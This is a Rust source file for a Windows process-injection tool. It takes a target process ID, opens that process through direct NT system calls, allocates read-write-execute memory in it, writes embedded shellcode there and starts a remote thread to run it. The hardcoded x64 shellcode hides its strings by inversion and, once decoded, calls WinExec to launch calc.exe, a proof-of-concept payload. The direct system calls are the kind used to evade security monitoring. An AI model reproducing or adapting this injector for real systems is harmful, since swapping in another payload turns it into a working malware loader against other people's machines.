#![allow(non_snake_case)]

use rust_syscalls::syscall;
use std::env;
use std::ffi::c_void;
use std::mem::size_of;
use std::process;
use std::ptr::null_mut;
use winapi::um::winnt::THREAD_ALL_ACCESS;

#[cfg(windows)]
use ntapi::ntapi_base::CLIENT_ID;
#[cfg(windows)]
use winapi::shared::ntdef::{HANDLE, NTSTATUS, NULL, OBJECT_ATTRIBUTES, PVOID};
#[cfg(windows)]
use winapi::shared::ntstatus::STATUS_SUCCESS;
#[cfg(windows)]
use winapi::um::winnt::{MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READWRITE, PROCESS_ALL_ACCESS};

macro_rules! syscall {
    ($name:expr, $($arg:expr),*) => {{
        #[cfg(windows)]
        {
            rust_syscalls::syscall!($name, $($arg),*)
        }
        #[cfg(not(windows))]
        {
            compile_error!("syscall! is only supported on Windows")
        }
    }}
}

#[cfg(windows)]
pub fn injection_and_run(pid: u32, shellcode: Vec<u8>) -> Result<(), u32> {
    let process_handle = open_process(pid)?;
    println!("Opened process handle: {:?}", process_handle);

    let base_address = allocate_memory(process_handle, shellcode.len())?;
    println!("Allocated memory at: {:?}", base_address);

    write_memory(process_handle, base_address, &shellcode)?;
    println!("Wrote shellcode to memory");

    let thread_handle = create_thread(process_handle, base_address)?;
    println!("Created thread: {:?}", thread_handle);

    // No need to resume the thread as it's created in a running state

    Ok(())
}

#[cfg(windows)]
fn open_process(pid: u32) -> Result<HANDLE, u32> {
    let mut process_handle: HANDLE = NULL;
    let oa = OBJECT_ATTRIBUTES {
        Length: size_of::<OBJECT_ATTRIBUTES>() as u32,
        RootDirectory: NULL,
        ObjectName: null_mut(),
        Attributes: 0,
        SecurityDescriptor: NULL,
        SecurityQualityOfService: NULL,
    };

    let client_id = CLIENT_ID {
        UniqueProcess: pid as PVOID,
        UniqueThread: null_mut(),
    };

    let status: NTSTATUS;
    unsafe {
        status = syscall!(
            "NtOpenProcess",
            &mut process_handle,
            PROCESS_ALL_ACCESS,
            &oa,
            &client_id
        );
    }

    if status != STATUS_SUCCESS {
        Err(status as u32)
    } else {
        Ok(process_handle)
    }
}

#[cfg(windows)]
fn allocate_memory(process_handle: HANDLE, size: usize) -> Result<PVOID, u32> {
    let mut base_address: PVOID = null_mut();
    let mut region_size: usize = size;
    let status: NTSTATUS;
    unsafe {
        status = syscall!(
            "NtAllocateVirtualMemory",
            process_handle,
            &mut base_address,
            0,
            &mut region_size,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );
    }

    if status != STATUS_SUCCESS {
        Err(status as u32)
    } else {
        Ok(base_address)
    }
}

#[cfg(windows)]
fn write_memory(process_handle: HANDLE, address: PVOID, data: &[u8]) -> Result<(), u32> {
    let mut bytes_written: usize = 0;
    let status: NTSTATUS;
    unsafe {
        status = syscall!(
            "NtWriteVirtualMemory",
            process_handle,
            address,
            data.as_ptr() as PVOID,
            data.len(),
            &mut bytes_written
        );
    }

    if status != STATUS_SUCCESS {
        Err(status as u32)
    } else {
        Ok(())
    }
}

#[cfg(windows)]
fn create_thread(process_handle: HANDLE, start_address: PVOID) -> Result<HANDLE, u32> {
    let mut thread_handle: HANDLE = null_mut();
    let status: NTSTATUS;
    unsafe {
        status = syscall!(
            "NtCreateThreadEx",
            &mut thread_handle,
            THREAD_ALL_ACCESS,
            null_mut::<OBJECT_ATTRIBUTES>(),
            process_handle,
            start_address,
            null_mut::<c_void>(),
            0, // Create suspended flag (use CREATE_SUSPENDED if you want it initially suspended)
            0,
            0,
            0,
            null_mut::<c_void>()
        );
    }
    if status != STATUS_SUCCESS {
        println!("Failed to create thread. Error code: {}", status);
        Err(status as u32)
    } else {
        println!("Successfully created thread: {:?}", thread_handle);
        Ok(thread_handle)
    }
}

fn main() {
    // Parse command-line arguments
    let args: Vec<String> = env::args().collect();
    if args.len() != 2 {
        eprintln!("Usage: {} <target_pid>", args[0]);
        process::exit(1);
    }

    // Parse the target process ID
    let target_pid: u32 = match args[1].parse() {
        Ok(pid) => pid,
        Err(_) => {
            eprintln!("Invalid process ID");
            process::exit(1);
        }
    };

    let mut buffer: [u8; 205] = [
        0x48, 0x31, 0xff, 0x48, 0xf7, 0xe7, 0x65, 0x48, 0x8b, 0x58, 0x60, 0x48, 0x8b, 0x5b, 0x18,
        0x48, 0x8b, 0x5b, 0x20, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x1b, 0x48, 0x8b, 0x5b, 0x20, 0x49,
        0x89, 0xd8, 0x8b, 0x5b, 0x3c, 0x4c, 0x01, 0xc3, 0x48, 0x31, 0xc9, 0x66, 0x81, 0xc1, 0xff,
        0x88, 0x48, 0xc1, 0xe9, 0x08, 0x8b, 0x14, 0x0b, 0x4c, 0x01, 0xc2, 0x4d, 0x31, 0xd2, 0x44,
        0x8b, 0x52, 0x1c, 0x4d, 0x01, 0xc2, 0x4d, 0x31, 0xdb, 0x44, 0x8b, 0x5a, 0x20, 0x4d, 0x01,
        0xc3, 0x4d, 0x31, 0xe4, 0x44, 0x8b, 0x62, 0x24, 0x4d, 0x01, 0xc4, 0xeb, 0x32, 0x5b, 0x59,
        0x48, 0x31, 0xc0, 0x48, 0x89, 0xe2, 0x51, 0x48, 0x8b, 0x0c, 0x24, 0x48, 0x31, 0xff, 0x41,
        0x8b, 0x3c, 0x83, 0x4c, 0x01, 0xc7, 0x48, 0x89, 0xd6, 0xf3, 0xa6, 0x74, 0x05, 0x48, 0xff,
        0xc0, 0xeb, 0xe6, 0x59, 0x66, 0x41, 0x8b, 0x04, 0x44, 0x41, 0x8b, 0x04, 0x82, 0x4c, 0x01,
        0xc0, 0x53, 0xc3, 0x48, 0x31, 0xc9, 0x80, 0xc1, 0x07, 0x48, 0xb8, 0x0f, 0xa8, 0x96, 0x91,
        0xba, 0x87, 0x9a, 0x9c, 0x48, 0xf7, 0xd0, 0x48, 0xc1, 0xe8, 0x08, 0x50, 0x51, 0xe8, 0xb0,
        0xff, 0xff, 0xff, 0x49, 0x89, 0xc6, 0x48, 0x31, 0xc9, 0x48, 0xf7, 0xe1, 0x50, 0x48, 0xb8,
        0x9c, 0x9e, 0x93, 0x9c, 0xd1, 0x9a, 0x87, 0x9a, 0x48, 0xf7, 0xd0, 0x50, 0x48, 0x89, 0xe1,
        0x48, 0xff, 0xc2, 0x48, 0x83, 0xec, 0x20, 0x41, 0xff, 0xd6,
    ];

    let shellcode = buffer.to_vec();

    // Perform the injection
    println!("Attempting to inject shellcode into process {}", target_pid);
    match injection_and_run(target_pid, shellcode) {
        Ok(_) => println!("Injection successful"),
        Err(e) => eprintln!("Injection failed with error code: {}", e),
    }
}
